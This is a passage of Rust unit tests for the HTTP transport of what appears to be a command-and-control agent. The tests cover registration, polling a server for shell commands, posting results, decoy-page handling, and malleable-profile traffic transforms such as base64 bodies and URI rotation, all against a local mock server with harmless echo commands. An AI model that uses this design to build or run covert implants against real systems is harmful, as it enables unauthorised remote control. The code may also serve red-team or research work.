        let (token, cmds) = timeout(T, ht::register(&client, &base, &hello())).await.unwrap().unwrap();
        assert_eq!(token, "tok-abc");
        assert_eq!(cmds.len(), 2);
        assert_eq!(cmds[1].command, "shell echo 2");
        let reqs = collect(join).await;
        let req = String::from_utf8_lossy(&reqs[0]);
        assert!(req.starts_with("POST /register "), "register path: {}", req.lines().next().unwrap());
    }

    #[tokio::test]
    async fn register_http_error_status_is_an_error() {
        let (port, join) = canned_server(500, b"oops".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let err = timeout(T, ht::register(&client, &base, &hello())).await.unwrap().unwrap_err();
        assert!(err.contains("Register failed: HTTP 500"), "got: {}", err);
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn poll_empty_data_array_means_no_commands() {
        let (port, join) = canned_server(200, b"{\"data\":[]}".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let cmds = timeout(T, ht::poll(&client, &base, "tok", "/api/tasks")).await.unwrap().unwrap();
        assert!(cmds.is_empty());
        let reqs = collect(join).await;
        let req = String::from_utf8_lossy(&reqs[0]);
        assert!(req.starts_with("GET /api/tasks "), "poll path: {}", req.lines().next().unwrap());
 // http::HeaderName normalizes to lowercase on the wire.
        assert!(req.to_ascii_lowercase().contains("x-session-token: tok"),
                "session token header must be sent");
    }

    #[tokio::test]
    async fn poll_decoy_page_means_session_invalid() {
        let (port, join) = canned_server(200, b"<html><body>it works</body></html>".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let err = timeout(T, ht::poll(&client, &base, "tok", "/p")).await.unwrap().unwrap_err();
        assert!(
            matches!(err, ht::HttpFailure::SessionInvalid(_)),
            "decoy body must classify as SessionInvalid, got {:?}", err
        );
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn poll_404_means_session_invalid() {
        let (port, join) = canned_server(404, b"nope".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let err = timeout(T, ht::poll(&client, &base, "tok", "/p")).await.unwrap().unwrap_err();
        assert!(matches!(err, ht::HttpFailure::SessionInvalid(_)), "got {:?}", err);
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn poll_500_means_transient_transport() {
        let (port, join) = canned_server(500, b"nope".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let err = timeout(T, ht::poll(&client, &base, "tok", "/p")).await.unwrap().unwrap_err();
        assert!(matches!(err, ht::HttpFailure::Transport(_)), "got {:?}", err);
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn poll_returns_valid_command_batch() {
        let c1 = cmd("s9", 3);
        let body = serde_json::to_string(&vec![c1]).unwrap();
        let (port, join) = canned_server(200, body.into_bytes(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let cmds = timeout(T, ht::poll(&client, &base, "tok", "/p")).await.unwrap().unwrap();
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0].command, "shell echo 3");
        assert_eq!(cmds[0].counter, 3);
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn send_result_empty_ack_is_ok() {
        let (port, join) = canned_server(200, Vec::new(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        timeout(T, ht::send_result(&client, &base, "tok", &resp(1, "done"), "/r")).await.unwrap().unwrap();
        let reqs = collect(join).await;
        let req = String::from_utf8_lossy(&reqs[0]);
        assert!(req.starts_with("POST /r "), "result path: {}", req.lines().next().unwrap());
 // http::HeaderName normalizes to lowercase on the wire.
        assert!(req.to_ascii_lowercase().contains("x-session-token: tok"));
    }

    #[tokio::test]
    async fn send_result_nonempty_ack_means_session_invalid() {
        let (port, join) = canned_server(200, b"ok".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let err = timeout(T, ht::send_result(&client, &base, "tok", &resp(1, "x"), "/r"))
            .await.unwrap().unwrap_err();
        assert!(matches!(err, ht::HttpFailure::SessionInvalid(_)), "got {:?}", err);
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn send_result_profile_applies_post_transform() {
 // Base64 POST transform: the body on the wire must be the b64 of
 // the JSON, with the octet-stream content type.
        let mut profile = rcm::common::MalleableProfile::default();
        profile.http_post.uris = vec!["/post".into()];
        profile.http_post.data_transform = vec![TransformStep::Base64];
        let (port, join) = canned_server(200, Vec::new(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let mut rot = ht::UriRotator::new();
        timeout(T, ht::send_result_profile(&client, &base, "tok", &resp(9, "payload"), &mut rot, &profile))
            .await.unwrap().unwrap();
        let reqs = collect(join).await;
        let req = String::from_utf8_lossy(&reqs[0]);
        assert!(req.starts_with("POST /post "));
        assert!(req.to_ascii_lowercase().contains("content-type: application/octet-stream"));
        let split = reqs[0].windows(4).position(|w| w == b"\r\n\r\n").unwrap() + 4;
        let wire = &reqs[0][split..];
        let expected_json = serde_json::to_vec(&resp(9, "payload")).unwrap();
        use base64::Engine;
        assert_eq!(wire, base64::engine::general_purpose::STANDARD.encode(&expected_json).as_bytes(),
                   "wire body must be base64 of the json");
    }

    #[tokio::test]
    async fn poll_profile_reverses_get_transform_before_parsing() {
 // Server stores the command batch base64-encoded (GET transform);
 // the agent must reverse it before classification.
        let mut profile = rcm::common::MalleableProfile::default();
        profile.http_get.uris = vec!["/get".into()];
        profile.http_get.data_transform = vec![TransformStep::Base64];
        let batch = serde_json::to_string(&vec![cmd("s7", 4)]).unwrap();
        use base64::Engine;
        let body = base64::engine::general_purpose::STANDARD.encode(batch.as_bytes());
        let (port, join) = canned_server(200, body.into_bytes(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let mut rot = ht::UriRotator::new();
        let batch = timeout(T, ht::poll_profile(&client, &base, "tok", &mut rot, &profile))
            .await.unwrap().unwrap();
        assert_eq!(batch.commands.len(), 1);
        assert_eq!(batch.commands[0].command, "shell echo 4");
        let _ = collect(join).await;
    }

    #[tokio::test]
    async fn poll_profile_decoy_fails_reverse_transform_as_session_invalid() {
 // With a GET transform configured, the decoy HTML page fails the
 // reverse transform -> SessionInvalid (not a parse error later).
        let mut profile = rcm::common::MalleableProfile::default();
        profile.http_get.uris = vec!["/get".into()];
        profile.http_get.data_transform = vec![TransformStep::Prepend("MAGIC".into())];
        let (port, join) = canned_server(200, b"<html>decoy</html>".to_vec(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
        let mut rot = ht::UriRotator::new();
        let err = timeout(T, ht::poll_profile(&client, &base, "tok", &mut rot, &profile))
            .await.unwrap().unwrap_err();
        assert!(matches!(err, ht::HttpFailure::SessionInvalid(_)), "got {:?}", err);
        let _ = collect(join).await;
    }
}
